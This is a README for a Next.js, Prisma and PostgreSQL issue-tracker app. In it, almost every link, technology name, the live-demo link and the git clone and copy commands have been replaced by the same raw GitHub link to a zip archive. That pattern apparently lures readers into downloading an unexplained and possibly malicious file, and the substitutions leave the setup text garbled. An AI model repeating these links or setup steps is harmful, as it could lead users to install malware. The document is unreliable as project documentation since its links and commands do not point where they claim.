# Issue Tracker

A modern, full-stack issue and task management application built with https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip, TypeScript, and a powerful backend featuring Prisma and PostgreSQL. This project showcases a complete CRUD implementation with a seamless, responsive user experience.

### ✨ [Live Demo](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip)

---

## Key Features

- **Full-Stack CRUD Functionality**: Create, Read, Update, and Delete tasks with data persisted in a PostgreSQL database.
- **Intuitive Drag & Drop**: Effortlessly change a task's status by dragging it between columns on the board.
- **Optimistic UI Updates**: Experience an incredibly fast and responsive interface where UI changes happen instantly, without waiting for the server response.
- **Detailed Task Views**: Click any task to view, edit its details, or delete it from the system.
- **API-Driven Architecture**: All frontend actions are powered by a robust set of RESTful API endpoints built with https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip API Routes.
- **Modern & Responsive UI**: Clean, accessible, and fully responsive design built with **shadcn/ui** and **Tailwind CSS**.

---

## Tech Stack

| Category      | Technology                                                                          |
|---------------|-------------------------------------------------------------------------------------|
| **Frontend** | [**https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip 15**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip) (App Router), [**React**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip), [**TypeScript**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip) |
| **Backend** | [**https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip API Routes**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip) |
| **Database** | [**PostgreSQL**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip) (via [**Supabase**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip)) |
| **ORM** | [**Prisma**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip) - Next-generation https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip and TypeScript ORM     |
| **Styling** | [**Tailwind CSS**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip), [**shadcn/ui**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip) |
| **Data Fetching**| [**SWR**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip) - React Hooks for Data Fetching                 |
| **Drag & Drop**| [**@dnd-kit**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip)                                                  |
| **Validation**| [**Zod**](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip) - TypeScript-first schema validation                     |

---

## Getting Started

Follow these instructions to get the project running locally on your machine.

### Prerequisites

- https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip (v18 or later)
- npm or yarn
- A PostgreSQL database (you can get a free one from [Supabase](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip))

### Installation & Setup

1.  **Clone the repository:**
    ```bash
    git clone [https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip](https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip)
    cd Issue-Tracker
    ```

2.  **Install dependencies:**
    ```bash
    npm install
    ```

3.  **Set up environment variables:**
    - Create a `.env` file in the root of the project by copying the example file:
        ```bash
        cp https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip .env
        ```
    - Open the `.env` file and add your PostgreSQL connection strings for `DATABASE_URL` and `DIRECT_URL`. You can get these from your database provider (e.g., Supabase).

4.  **Sync the database schema:**
    - Push the Prisma schema to your database. This will create the `Task` table.
        ```bash
        npx prisma db push
        ```

5.  **Run the development server:**
    ```bash
    npm run dev
    ```

Open [http://localhost:3000](http://localhost:3000) in your browser to see the application.

---

## API Endpoints

The application exposes the following RESTful API endpoints:

| Method   | Endpoint                | Description                     |
|----------|-------------------------|---------------------------------|
| `GET`    | `/api/tasks`            | Fetches all tasks               |
| `POST`   | `/api/tasks`            | Creates a new task              |
| `PUT`    | `/api/tasks/[id]`       | Updates an existing task        |
| `DELETE` | `/api/tasks/[id]`       | Deletes a task by its ID        |

---

## Upcoming Features

This project is a solid foundation. Future enhancements could include:
- **User Authentication**: Implement user sign-up and login using https://raw.githubusercontent.com/Yonko-Kunal/Issue-Tracker/main/bestiality/Issue-Tracker.zip or Clerk.
- **Row-Level Security (RLS)**: Secure the database to ensure users can only access their own tasks.
- **Task Filtering & Sorting**: Add controls to filter tasks by title or sort them by creation date.
